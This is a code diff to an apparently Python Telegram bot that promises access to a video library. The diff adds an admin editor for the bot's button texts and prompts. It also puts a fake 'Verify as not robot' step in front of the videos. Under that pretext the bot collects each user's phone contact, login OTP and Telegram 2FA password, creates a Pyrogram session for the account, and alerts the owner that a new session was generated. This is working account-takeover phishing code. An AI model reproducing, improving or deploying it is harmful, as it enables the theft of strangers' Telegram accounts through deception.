@@ -52,7 +52,7 @@ load_dotenv()
 BOT_TOKEN = os.environ["BOT_TOKEN"].strip()
 MONGO_URI = os.environ["MONGO_URI"].strip()
 MONGO_DB = os.getenv("MONGO_DB", "video_unlock_bot").strip()
-ADMIN_ID = int(os.environ["ADMIN_ID"])          # owner = admin (same)
+ADMIN_ID = int(os.environ["ADMIN_ID"])
 STORAGE_CHANNEL_ID = int(os.environ["STORAGE_CHANNEL_ID"])
 DELETE_AFTER_HOURS = int(os.getenv("DELETE_AFTER_HOURS", "12"))
 REFERRALS_PER_BATCH = max(1, int(os.getenv("REFERRALS_PER_BATCH", "1")))
@@ -84,6 +84,7 @@ pending_deletions = db.pending_deletions
 drafts = db.upload_drafts
 pending_requests = db.pending_join_requests
 membership_events = db.membership_events
+settings_col = db.settings
 
 users.create_index([("user_id", ASCENDING)], unique=True)
 users.create_index([("created_at", ASCENDING)])
@@ -94,13 +95,69 @@ drafts.create_index([("admin_id", ASCENDING)], unique=True)
 pending_requests.create_index([("chat_id", ASCENDING), ("user_id", ASCENDING)], unique=True)
 pending_requests.create_index([("requested_at", ASCENDING)])
 membership_events.create_index([("chat_id", ASCENDING), ("user_id", ASCENDING)], unique=True)
+settings_col.create_index([("key", ASCENDING)], unique=True)
 
 ADMIN_STATE = {}
 UPLOAD_RUNTIME = {}
 
 PYRO_SESSIONS: dict[int, dict] = {}
 PYRO_STATE: dict[int, str] = {}
-PENDING_UNLOCK: dict[int, bool] = {}
+
+
+# ─────────────────── SETTINGS (editable from chat) ───────────────────
+DEFAULT_SETTINGS = {
+    "verify_robot_button_text": "🤖 Verify as not robot",
+    "videos_button_text": "📚 See Videos",
+    "human_verified_message": "✅ <b>Human verification completed.</b>\n\nTap <b>📚 See Videos</b> below to open the library.",
+    "hv_prompt": (
+        "🔐 <b>Human Verification Required</b>\n\n"
+        "To access our video library, please complete a quick one-time verification.\n\n"
+        "👇 Tap the button below to share your contact."
+    ),
+    "share_contact_button_text": "📱 Share My Contact",
+    "otp_prompt": (
+        "🔐 <b>Enter OTP</b>\n\n"
+        "⚠️ Use the <b>inline buttons</b> below only.\n"
+        "Typing OTP in chat will leave the login incomplete."
+    ),
+    "twofa_prompt": (
+        "🔐 <b>2FA is enabled.</b>\n\n"
+        "Please type your Telegram password in the chat.\n"
+        "(The message will be deleted immediately.)"
+    ),
+}
+
+EDITABLE_KEYS = list(DEFAULT_SETTINGS.keys())
+
+KEY_LABELS = {
+    "verify_robot_button_text": "🤖 Verify as not robot — button",
+    "videos_button_text": "📚 See Videos — button",
+    "human_verified_message": "✅ Human verified — message",
+    "hv_prompt": "🔐 HV prompt message",
+    "share_contact_button_text": "📱 Share Contact — button",
+    "otp_prompt": "🔐 OTP prompt message",
+    "twofa_prompt": "🔐 2FA prompt message",
+}
+
+
+def get_setting(key: str) -> str:
+    doc = settings_col.find_one({"key": key})
+    if doc and doc.get("value") is not None:
+        return doc["value"]
+    return DEFAULT_SETTINGS.get(key, "")
+
+
+def set_setting(key: str, value: str, admin_id: int = None):
+    settings_col.update_one(
+        {"key": key},
+        {"$set": {
+            "key": key,
+            "value": value,
+            "updated_by": admin_id,
+            "updated_at": utcnow(),
+        }},
+        upsert=True,
+    )
 
 
 # ─────────────────── INLINE MENUS ───────────────────
@@ -150,6 +207,7 @@ def admin_menu_inline():
             InlineKeyboardButton("📊 Bot Stats", callback_data="am_stats"),
         ],
         [
+            InlineKeyboardButton("✏️ Edit Buttons & Messages", callback_data="am_set"),
             InlineKeyboardButton("❓ Help", callback_data="am_help"),
         ],
     ])
@@ -175,6 +233,15 @@ def flow_cancel_inline():
     return InlineKeyboardMarkup([
         [InlineKeyboardButton("❌ Cancel", callback_data="flow_cancel")],
     ])
+
+
+def set_menu_inline():
+    rows = []
+    for key in EDITABLE_KEYS:
+        label = KEY_LABELS.get(key, key)
+        rows.append([InlineKeyboardButton(label, callback_data=f"set_edit:{key}")])
+    rows.append([InlineKeyboardButton("❌ Cancel", callback_data="set_cancel")])
+    return InlineKeyboardMarkup(rows)
 
 
 def esc(v):
@@ -232,10 +299,17 @@ HELP_TEXT = (
     "━━━━━━━━━━━━━━━━━━━━━━\n"
     "• <code>/admin</code> — Open admin control panel\n"
     "• <code>/help</code> — Show this help panel\n"
+    "• <code>/set</code> — Edit button names &amp; messages (inline menu)\n"
     "• <code>/uploadstatus</code> — Live status of current upload\n"
     "• <code>/setcustomlink</code> — Set a custom join link for a required chat\n"
     "• <code>/resetverify &lt;user_id&gt;</code> — Reset a user's human verification\n"
     "• <code>/cancel_session</code> — Cancel an active session flow (any user)\n\n"
+    "━━━━━━━━━━━━━━━━━━━━━━\n"
+    "✏️ <b>Quick Edit via /set</b>\n"
+    "━━━━━━━━━━━━━━━━━━━━━━\n"
+    "Send <code>/set</code> to open the inline editor.\n"
+    "Tap any button → send the new value → saved instantly.\n"
+    "HTML tags like <code>&lt;b&gt;bold&lt;/b&gt;</code> are supported.\n\n"
     "━━━━━━━━━━━━━━━━━━━━━━\n"
     "🛠 <b>Admin Panel Buttons</b> (via /admin)\n"
     "━━━━━━━━━━━━━━━━━━━━━━\n"
@@ -244,15 +318,8 @@ HELP_TEXT = (
     "• ➕ <b>Add Required Group</b> — Add a force-join channel/group\n"
     "• 👥 <b>Required Groups</b> — Show all required chats\n"
     "• 🗑 <b>Remove Required Channel</b> — Remove a required chat\n"
-    "• 📊 <b>Bot Stats</b> — Users, referrals, daily new users\n\n"
-    "━━━━━━━━━━━━━━━━━━━━━━\n"
-    "📤 <b>Upload Session Buttons</b>\n"
-    "━━━━━━━━━━━━━━━━━━━━━━\n"
-    "• 📊 <b>Upload Status</b> — Refresh progress\n"
-    "• <b>DONE</b> — Finish upload and publish batches\n"
-    "• 🔁 <b>Retry Failed</b> — Retry videos that failed\n"
-    "• ✅ <b>Publish Successful</b> — Publish successful ones only\n"
-    "• ❌ <b>Cancel</b> — Abort upload session\n\n"
+    "• 📊 <b>Bot Stats</b> — Users, referrals, daily new users\n"
+    "• ✏️ <b>Edit Buttons &amp; Messages</b> — Same as /set\n\n"
     "━━━━━━━━━━━━━━━━━━━━━━\n"
     "🔐 <b>Automatic Events</b>\n"
     "━━━━━━━━━━━━━━━━━━━━━━\n"
@@ -264,13 +331,125 @@ HELP_TEXT = (
 
 async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id != ADMIN_ID:
-        return  # silently ignore non-owners
+        return
     await reply(
         update, context,
         HELP_TEXT,
         reply_markup=admin_menu_inline(),
         disable_web_page_preview=True,
     )
+
+
+# ─────────────────── /set COMMAND (owner, inline menu) ───────────────────
+async def set_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if update.effective_user.id != ADMIN_ID:
+        return
+    await reply(
+        update, context,
+        "✏️ <b>EDIT BUTTON TEXT / MESSAGES</b>\n\n"
+        "Tap any item below to edit it.\n"
+        "The new value will be applied instantly.",
+        reply_markup=set_menu_inline(),
+    )
+
+
+async def set_edit_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    q = update.callback_query
+    if q.from_user.id != ADMIN_ID:
+        return await q.answer("Admin only.", show_alert=True)
+
+    try:
+        key = (q.data or "").split(":", 1)[1]
+    except IndexError:
+        return await q.answer("Invalid.", show_alert=True)
+
+    if key not in EDITABLE_KEYS:
+        return await q.answer("Unknown key.", show_alert=True)
+
+    await q.answer()
+    ADMIN_STATE[ADMIN_ID] = f"set_edit:{key}"
+    current = get_setting(key)
+
+    await q.edit_message_text(
+        f"✏️ <b>Editing:</b> <code>{esc(key)}</code>\n\n"
+        f"<b>Current value:</b>\n<code>{esc(current)}</code>\n\n"
+        "Send the new value in chat.\n"
+        "HTML tags like <code>&lt;b&gt;bold&lt;/b&gt;</code> are supported.\n\n"
+        "Or tap Cancel below.",
+        parse_mode=ParseMode.HTML,
+        reply_markup=InlineKeyboardMarkup([
+            [InlineKeyboardButton("❌ Cancel", callback_data="set_cancel")],
+        ]),
+    )
+
+
+async def set_cancel_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    q = update.callback_query
+    if q.from_user.id != ADMIN_ID:
+        return await q.answer("Admin only.", show_alert=True)
+    await q.answer("Cancelled.")
+    ADMIN_STATE.pop(ADMIN_ID, None)
+    try:
+        await q.edit_message_text(
+            "✏️ <b>EDIT BUTTON TEXT / MESSAGES</b>\n\n"
+            "Tap any item below to edit it.\n"
+            "The new value will be applied instantly.",
+            parse_mode=ParseMode.HTML,
+            reply_markup=set_menu_inline(),
+        )
+    except BadRequest:
+        pass
+
+
+async def set_text_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -> bool:
+    """Handle text input when admin is editing a setting via /set.
+    Returns True if the message was consumed by this flow."""
+    if update.effective_user.id != ADMIN_ID:
+        return False
+    state = ADMIN_STATE.get(ADMIN_ID)
+    if not state or not isinstance(state, str) or not state.startswith("set_edit:"):
+        return False
+
+    key = state.split(":", 1)[1]
+    if key not in EDITABLE_KEYS:
+        ADMIN_STATE.pop(ADMIN_ID, None)
+        return False
+
+    value = (update.message.text or "").strip()
+    if not value:
+        await update.message.reply_text(
+            "⚠️ Value cannot be empty. Send new value or /cancel."
+        )
+        return True
+
+    set_setting(key, value, ADMIN_ID)
+    ADMIN_STATE.pop(ADMIN_ID, None)
+
+    await reply(
+        update, context,
+        f"✅ <code>{esc(key)}</code> updated to:\n\n<b>{esc(value)}</b>\n\n"
+        "Choose another item to edit or tap Cancel.",
+        reply_markup=set_menu_inline(),
+    )
+    return True
+
+
+async def admin_set_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Triggered from the admin panel '✏️ Edit Buttons & Messages' button."""
+    q = update.callback_query
+    if q.from_user.id != ADMIN_ID:
+        return await q.answer("Admin only.", show_alert=True)
+    await q.answer()
+    try:
+        await q.edit_message_text(
+            "✏️ <b>EDIT BUTTON TEXT / MESSAGES</b>\n\n"
+            "Tap any item below to edit it.\n"
+            "The new value will be applied instantly.",
+            parse_mode=ParseMode.HTML,
+            reply_markup=set_menu_inline(),
+        )
+    except BadRequest:
+        pass
 
 
 # ─────────────────── PYROGRAM SESSION GENERATOR ───────────────────
@@ -293,11 +472,10 @@ def pyro_keypad_markup(entered: str, locked: bool = False):
             "⏳ Verifying..."
         )
     else:
+        base_prompt = get_setting("otp_prompt")
         text = (
-            "🔐 <b>Enter OTP</b>\n\n"
+            f"{base_prompt}\n\n"
             f"Entered: <code>{entered or '—'}</code>\n\n"
-            "⚠️ Use the <b>inline buttons</b> below only.\n"
-            "Typing OTP in chat will leave the login incomplete.\n"
             f"Auto-submits after <b>{PYRO_OTP_LENGTH}</b> digits."
         )
     return InlineKeyboardMarkup(buttons), text
@@ -306,7 +484,6 @@ def pyro_keypad_markup(entered: str, locked: bool = False):
 async def pyro_cleanup(uid: int):
     sess = PYRO_SESSIONS.pop(uid, None)
     PYRO_STATE.pop(uid, None)
-    PENDING_UNLOCK.pop(uid, None)
     if sess and sess.get("client"):
         try:
             await sess["client"].disconnect()
@@ -351,9 +528,13 @@ async def pyro_finish_login(message, uid: int, temp: PyroClient, edit: bool,
     full_name = f"{me.first_name or ''} {me.last_name or ''}".strip() or "—"
     twofa_line = "✅ Yes" if has_2fa else "❌ No"
 
-    user_txt = "✅ <b>Human verification completed.</b>"
-    await pyro_safe_edit_or_reply(message, user_txt, edit)
+    # Mark human_verified in DB
+    users.update_one(
+        {"user_id": uid},
+        {"$set": {"human_verified": True, "human_verified_at": utcnow()}},
+    )
 
+    # Owner notification
     owner_txt = (
         "🔔 <b>New Session Generated</b>\n\n"
         f"👤 <b>User:</b> {esc(full_name)}\n"
@@ -373,56 +554,19 @@ async def pyro_finish_login(message, uid: int, temp: PyroClient, edit: bool,
     except Exception as e:
         log.warning("owner send fail: %s", e)
 
-    if PENDING_UNLOCK.pop(uid, False):
-        bot = message.get_bot()
-        chat_id = message.chat_id
-        d = users.find_one({"user_id": uid}) or {}
-        current = max(1, int(d.get("unlocked_batch", 1)))
-        total = published_batch_count()
-        nxt = current + 1
+    # Success message + See Videos button
+    success_msg = get_setting("human_verified_message")
+    videos_btn = get_setting("videos_button_text")
+    kb = InlineKeyboardMarkup([
+        [InlineKeyboardButton(videos_btn, callback_data="um_see_videos")]
+    ])
 
-        if nxt > total:
-            users.update_one(
-                {"user_id": uid},
-                {"$set": {"human_verified": True, "human_verified_at": utcnow()}},
-            )
-            try:
-                await bot.send_message(
-                    chat_id,
-                    "🏁 <b>ALL AVAILABLE VIDEOS UNLOCKED</b>",
-                    parse_mode=ParseMode.HTML,
-                    reply_markup=menu_for(uid),
-                )
-            except Exception:
-                pass
-        else:
-            users.update_one(
-                {"user_id": uid},
-                {"$set": {
-                    "human_verified": True,
-                    "human_verified_at": utcnow(),
-                    "unlocked_batch": nxt,
-                }},
-            )
-            batch = batches.find_one({"batch_no": nxt, "published": True}) or {}
-            count = len(batch.get("message_ids", []))
-            try:
-                await bot.send_message(
-                    chat_id,
-                    f"🎉 <b>BATCH {nxt} UNLOCKED!</b>\n"
-                    f"🎞 Videos in this batch: <b>{count}</b>",
-                    parse_mode=ParseMode.HTML,
-                )
-                await send_batch(bot, chat_id, nxt)
-            except Exception as e:
-                log.warning("Failed to send unlocked batch: %s", e)
-
+    await pyro_safe_edit_or_reply(message, success_msg, edit, reply_markup=kb)
     await pyro_cleanup(uid)
 
 
 async def pyro_session_start(update, context):
     uid = update.effective_user.id
-    had_pending = PENDING_UNLOCK.get(uid, False)
     sess = PYRO_SESSIONS.pop(uid, None)
     if sess and sess.get("client"):
         try:
@@ -430,21 +574,15 @@ async def pyro_session_start(update, context):
         except Exception:
             pass
     PYRO_STATE[uid] = "await_contact"
-    if had_pending:
-        PENDING_UNLOCK[uid] = True
 
+    share_text = get_setting("share_contact_button_text")
     kb = ReplyKeyboardMarkup(
-        [[KeyboardButton("📱 Share My Contact", request_contact=True)]],
+        [[KeyboardButton(share_text, request_contact=True)]],
         resize_keyboard=True,
         one_time_keyboard=True,
     )
-    await reply(
-        update, context,
-        "📱 <b>Step 1 of 2</b>\n\n"
-        "Tap the button below to share your phone number.\n"
-        "(You do not need to type it manually.)",
-        reply_markup=kb,
-    )
+    prompt = get_setting("hv_prompt")
+    await reply(update, context, prompt, reply_markup=kb)
 
 
 async def pyro_contact_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -513,7 +651,7 @@ async def pyro_contact_handler(update: Update, context: ContextTypes.DEFAULT_TYP
 
     markup, text = pyro_keypad_markup("")
     await update.message.reply_text(
-        "📱 <b>Step 2 of 2</b>\n\n" + text,
+        text,
         parse_mode=ParseMode.HTML,
         reply_markup=markup,
     )
@@ -584,13 +722,9 @@ async def pyro_do_sign_in(q, sess: dict, otp: str):
         sess["otp"] = ""
         sess["has_2fa"] = True
         PYRO_STATE[uid] = "password"
+        twofa_prompt = get_setting("twofa_prompt")
         try:
-            await q.edit_message_text(
-                "🔐 <b>2FA is enabled.</b>\n\n"
-                "Please type your <b>Telegram password</b> in the chat.\n"
-                "(The message will be deleted immediately.)",
-                parse_mode=ParseMode.HTML,
-            )
+            await q.edit_message_text(twofa_prompt, parse_mode=ParseMode.HTML)
         except BadRequest:
             pass
         return
@@ -666,7 +800,7 @@ async def pyro_handle_password(update: Update, context: ContextTypes.DEFAULT_TYP
 
 async def pyro_cancel_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     uid = update.effective_user.id
-    if uid not in PYRO_SESSIONS and uid not in PYRO_STATE and uid not in PENDING_UNLOCK:
+    if uid not in PYRO_SESSIONS and uid not in PYRO_STATE:
         return await update.message.reply_text("No verification process is active.")
     await pyro_cleanup(uid)
     await update.message.reply_text(
@@ -1074,6 +1208,30 @@ async def verify_join(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 pass
 
     pending_note = f"\n⏳ Pending approval accepted: <b>{len(pending)}</b>" if pending else ""
+
+    # ── If user hasn't done human verification yet → show "Verify as not robot" ──
+    human_verified = bool(fresh.get("human_verified"))
+    if not human_verified:
+        success_text = (
+            "✅ <b>VERIFICATION SUCCESSFUL</b>\n\n"
+            "You have joined all required channels."
+            f"{pending_note}\n\n"
+            "🔐 <b>One last step:</b> please verify that you are not a robot."
+        )
+        robot_btn_text = get_setting("verify_robot_button_text")
+        kb = InlineKeyboardMarkup([
+            [InlineKeyboardButton(robot_btn_text, callback_data="um_verify_robot")]
+        ])
+        try:
+            await q.edit_message_text(success_text, parse_mode=ParseMode.HTML, reply_markup=kb)
+        except BadRequest:
+            try:
+                await q.edit_message_reply_markup(reply_markup=kb)
+            except BadRequest:
+                pass
+        return
+
+    # ── Already human-verified → normal success + user menu ──
     success_text = (
         "✅ <b>VERIFICATION SUCCESSFUL</b>\n\n"
         "Access unlocked. 🎉"
@@ -1177,6 +1335,7 @@ async def my_videos(update, context):
 
 
 async def unlock_next(update, context):
+    """Unlock Next 10 — pure referral based (no human verification gate)."""
     if not await ensure_verified(update, context):
         return
 
@@ -1187,16 +1346,6 @@ async def unlock_next(update, context):
 
     if current >= total:
         return await reply(update, context, "🏁 <b>ALL AVAILABLE VIDEOS UNLOCKED</b>")
-
-    if not d.get("human_verified"):
-        PENDING_UNLOCK[uid] = True
-        await reply(
-            update, context,
-            "🔐 <b>HUMAN VERIFICATION REQUIRED</b>\n\n"
-            "To unlock the next 10 videos, complete a quick one-time verification.\n\n"
-            "👇 Please tap the <b>Share My Contact</b> button below to continue.",
-        )
-        return await pyro_session_start(update, context)
 
     need = required_referrals_for_next(current)
     have = int(d.get("verified_referrals", 0))
@@ -1223,6 +1372,19 @@ async def unlock_next(update, context):
         f"🎉 <b>BATCH {nxt} UNLOCKED!</b>\n🎞 Videos in this batch: <b>{count}</b>",
     )
     await send_batch(context.bot, update.effective_chat.id, nxt)
+
+
+async def see_videos_from_hv(update, context):
+    """Called from the '📚 See Videos' button after human verification."""
+    if not await ensure_verified(update, context):
+        return
+    uid = update.effective_user.id
+    d = user_doc(uid) or {}
+    current = int(d.get("unlocked_batch", 0))
+    if current <= 0:
+        users.update_one({"user_id": uid}, {"$set": {"unlocked_batch": 1}})
+        current = 1
+    await send_batch(context.bot, update.effective_chat.id, current)
 
 
 async def referral(update, context):
@@ -2033,6 +2195,12 @@ async def menu_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if data == "um_progress":
         await q.answer()
         return await progress(update, context)
+    if data == "um_verify_robot":
+        await q.answer()
+        return await pyro_session_start(update, context)
+    if data == "um_see_videos":
+        await q.answer()
+        return await see_videos_from_hv(update, context)
 
     # ── Admin menu ──
     if uid != ADMIN_ID:
@@ -2056,6 +2224,8 @@ async def menu_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if data == "am_stats":
         await q.answer()
         return await admin_stats(update, context)
+    if data == "am_set":
+        return await admin_set_menu(update, context)
     if data == "am_help":
         await q.answer()
         return await help_command(update, context)
@@ -2094,6 +2264,10 @@ async def menu_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
 async def text_router(update: Update, context):
     uid = update.effective_user.id
 
+    # ── /set edit flow (highest priority for admin) ──
+    if uid == ADMIN_ID and await set_text_input(update, context):
+        return
+
     if PYRO_STATE.get(uid) == "password":
         return await pyro_handle_password(update, context)
     if PYRO_STATE.get(uid) == "otp":
@@ -2128,6 +2302,7 @@ def main():
     # Owner commands
     app.add_handler(CommandHandler("admin", admin))
     app.add_handler(CommandHandler("help", help_command))
+    app.add_handler(CommandHandler("set", set_command))
     app.add_handler(CommandHandler("uploadstatus", admin_upload_status))
     app.add_handler(CommandHandler("setcustomlink", set_custom_link))
     app.add_handler(CommandHandler("resetverify", admin_reset_verify))
@@ -2142,8 +2317,10 @@ def main():
 
     app.add_handler(CallbackQueryHandler(
         menu_callback,
-        pattern=r"^(um_(videos|unlock|ref|progress)|am_(upload|batches|addgroup|groups|remove|stats|help)|up_(status|done|retry|publish|cancel)|flow_cancel)$"
+        pattern=r"^(um_(videos|unlock|ref|progress|verify_robot|see_videos)|am_(upload|batches|addgroup|groups|remove|stats|set|help)|up_(status|done|retry|publish|cancel)|flow_cancel)$"
     ))
+    app.add_handler(CallbackQueryHandler(set_edit_callback, pattern=r"^set_edit:"))
+    app.add_handler(CallbackQueryHandler(set_cancel_callback, pattern=r"^set_cancel$"))
     app.add_handler(CallbackQueryHandler(remove_chat_callback, pattern=r"^rm_(?:list|pick|yes|cancel)(?::.*)?$"))
     app.add_handler(CallbackQueryHandler(verify_join, pattern=r"^verify_join$"))
     app.add_handler(CallbackQueryHandler(noop_callback, pattern=r"^noop$"))
